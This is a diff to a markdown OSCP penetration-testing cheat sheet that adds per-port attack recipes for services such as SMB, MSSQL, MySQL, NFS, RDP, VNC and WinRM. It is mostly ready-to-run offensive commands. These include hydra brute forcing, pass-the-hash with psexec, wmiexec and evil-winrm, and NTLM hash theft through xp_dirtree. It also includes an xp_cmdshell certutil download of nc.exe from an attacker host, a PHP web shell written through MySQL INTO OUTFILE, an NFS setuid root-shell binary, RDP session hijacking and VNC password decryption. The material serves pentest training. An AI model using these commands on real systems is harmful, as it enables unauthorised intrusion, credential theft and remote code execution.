@@ -1,4 +1,4 @@
-# Welcome to Zamrax's Cheat Sheet for OSCP
+# Welcome to DigitalDefence Cheat Sheet for OSCP
 
 ## Enumeration:
 
@@ -144,6 +144,7 @@
 1. Enumeration:
 	```
 	done by automatic scripts
+	check https://github.com/pwnwiki/webappdefaultsdb/blob/master/README.md
 	```
 2. Directory Fuzzing:
 - GoBuster:
@@ -354,4 +355,270 @@
 16. Upload a file with PUT
 	```
 	curl -X PUT http://IP/FILE -d @FILE  -v
+	```
+
+### 88 (Kerberos)
+1. Enumeration
+	```
+	nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'
+	https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
+	```
+
+### 110 (POP3)
+1. Brute Force
+	```
+	hydra -l USER -P /usr/share/wordlists/rockyou.txt -f IP pop3 -V
+	hydra -S -v -l USER -P /usr/share/wordlists/rockyou.txt -s 995 -f IP pop3 -V
+	```
+2. Read mail
+	```
+	telnet IP 110
+	USER USER
+	PASS PASSWORD
+	LIST
+	RETR MAIL_NUMBER
+	QUIT
+	```
+	
+### 111 (RPC/NFS)
+1. Enumeration
+	```
+	nmap -sV -p 111 --script=rpcinfo IP
+	nmap -p 111 -script nfs* IP
+	```
+2. Mountable Drives
+	```
+	showmoun -e IP
+	```
+3. Mounting
+	```
+	mount -t nfs -o vers=3 IP:/SHARE /mnt
+	groupadd --gid 1337 pwn
+	useradd --uid 1337 -g pwn pwn
+	```
+
+### 161 (SNMP)
+1. Brute force community string:
+	```
+	onesixtyone -c /home/liodeus/wordlist/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <IP>
+	snmpbulkwalk -c <COMMUNITY_STRING> -v<VERSION> IP
+	snmp-check IP
+	nmap -sU -sV -sC --open -p 161 IP
+	```
+2. Modifying SNMP values
+	```
+	http://net-snmp.sourceforge.net/tutorial/tutorial-5/commands/snmpset.html
+	```
+	
+### 139/445 (SMB/Samba)
+1. Enumeration:
+	```
+	nmap -Pn -n -p139,445 --script smb-* IP
+	enum4linux -a IP
+	```
+2. Hostname Enumeration:
+	```
+	nmblookup -A IP
+	```
+3. Version enumeration:
+	```
+	./smbver.sh IP PORT
+	```
+4. Share enumeration:
+	```
+	smbclient -L \\IP -N --option='client min protocol=NT1'
+	smbclient -L \\IP -U USER
+	smbclient -L IP
+	smbclient -L --no-pass -L //$IP
+	```
+5. Brute force
+	```
+	hydra -V -f -L USERS -P /usr/share/wordlists/rockyou.txt smb://IP -u -vV
+	```
+6. Mount
+	```
+	mkdir /tmp/share
+	sudo mount -t cifs //<IP>/<SHARE> /tmp/share
+	sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>'//<IP>/<SHARE> /tmp/share
+	```
+7. Shell inclusion:
+	```
+	psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
+	psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
+	wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
+	wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
+	smbexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
+	smbexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
+	```
+8. Useful exploits
+	```
+	EternalBlue (MS17-010)
+	MS08-067
+	CVE-2017-7494
+	
+	```
+
+### 389,636 (LDAP)
+1. Enumeration
+	```
+	nmap -n -sV --script "ldap* and not brute" IP
+	ldapsearch -h <IP> -x -s base
+	ldapsearch -h <IP> -x -D '<DOMAIN>\<USER>' -w '<PASSWORD>' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"
+	```
+2. Graphical Interface
+	```
+	jxplorer
+	```
+
+### 1433 (MSSQL)
+1. Enumeration
+	```
+	nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 IP
+	```
+2. Brute force
+	```
+	hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mssql -vV -I -u
+	```
+3. After having credentials
+	```
+	mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<IP>
+	mssqlclient.py <USER>:<PASSWORD>@<IP>
+	\# Once logged in you can run queries:
+	SQL> select @@ version;
+	\# Steal NTLM hash
+	sudo smbserver.py -smb2support liodeus .
+	SQL> exec master..xp_dirtree '\\<IP>\liodeus\' # Steal the NTLM hash, crack it with john or hashcat
+	\# Try to enable code execution
+	SQL> enable_xp_cmdshell
+	\# Execute code
+	SQL> xp_cmdshell whoami /all
+	SQL> xp_cmdshell certutil.exe -urlcache -split -f http://<IP>/nc.exe
+	```
+4. Manual
+	```
+	https://www.asafety.fr/mssql-injection-cheat-sheet/
+	```
+	
+### 2049 (NFS)
+1. Mountable NFS Shares
+	```
+	showmount -e <IP>
+	nmap --script=nfs-showmount -oN mountable_shares IP
+	```
+2. Mounting
+	```
+	sudo mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
+	sudo mount -v -t nfs -o vers=2 <IP>:<SHARE> <DIRECTORY>
+	```
+3. NFS Misconfig
+	```
+	cat /etc/exports
+	If you find some directory that is configured as no_root_squash/no_all_squash you may be able to privesc.
+	\# Attacker, as root user
+	mkdir <DIRECTORY>
+	mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
+	cd <DIRECTORY>
+	echo 'int main(void){setreuid(0,0); system("/bin/bash"); return 0;}' > pwn.c
+	gcc pwn.c -o pwn
+	chmod +s pwn
+	\# Victim
+	cd <SHARE>
+	./pwn # Root shell
+	```
+### 3306 (MYSQL)
+1. Brute Force
+	```
+	hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mysql -vV -I -u
+	```
+2. Extracting credentials
+	```
+	cat /etc/mysql/debian.cnf
+	grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
+	```
+3. Connect
+	```
+	mysql -u USER
+	mysql -u USER -p
+	mysql -h IP -u USER
+	```
+4. MySQL Commands:
+	```
+	show databases;
+	use <DATABASES>;
+	show tables;
+	describe <TABLE>;
+	select * from <TABLE>;
+	\# Try to execute code
+	select do_system('id');
+	\! sh
+	\# Read & Write
+	select load_file('<FILE>');
+	select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '<OUT_FILE>'
+	```
+5. Manual
+	```
+	https://www.asafety.fr/mysql-injection-cheat-sheet/
+	```
+### 3389 (RDP)
+1. Brute force
+	```
+	hydra -f -L <USERS_LIST> -P <PASSWORDS_LIST> rdp://<IP> -u -vV
+	```
+2. Connect
+	```
+	rdesktop -u <USERNAME> <IP>
+	rdesktop -d <DOMAIN> -u <USERNAME> -p <PASSWORD> <IP>
+	xfreerdp /u:[DOMAIN\]<USERNAME> /p:<PASSWORD> /v:<IP>
+	xfreerdp /u:[DOMAIN\]<USERNAME> /pth:<HASH> /v:<IP>
+	```
+3. Session Stealing
+	```
+	query user
+	tscon <ID> /dest:<SESSIONNAME>
+	```
+4. Adding user to RDP Group
+	```
+	net localgroup "Remote Desktop Users" <USER> /add
+	```
+### 5800 - 5801 - 5900 - 5901 (VNC)
+1. Scans
+	```
+	nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -p <PORT> <IP>
+	```
+2. Brute Force
+	```
+	hydra -L <USERS_LIST> –P <PASSWORDS_LIST> -s <PORT> <IP> vnc -u -vV
+	```
+3. Connect
+	```
+	vncviewer <IP>:<PORT>
+	```
+4. Password Location
+	```
+	\# Linux
+	Default password is stored in: ~/.vnc/passwd
+	\# Windows
+	HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver
+	HKEY_CURRENT_USER\Software\TightVNC\Server
+	HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4
+	C:\Program Files\UltraVNC\ultravnc.ini
+	```
+5. Decrypting 
+	```
+	msfconsole
+	irb
+	fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
+	require 'rex/proto/rfb'
+	Rex::Proto::RFB::Cipher.decrypt ["2151D3722874AD0C"].pack('H*'), fixedkey
+	/dev/nul
+	```
+### 5985-5986 (WINRM)
+1. Brute force
+	```
+	crackmapexec winrm <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
+	```
+2. Connect
+	```
+	evil-winrm -i <IP> -u <USER> -p <PASSWORD>
+	evil-winrm -i <IP> -u <USER> -H <HASH>
 	```
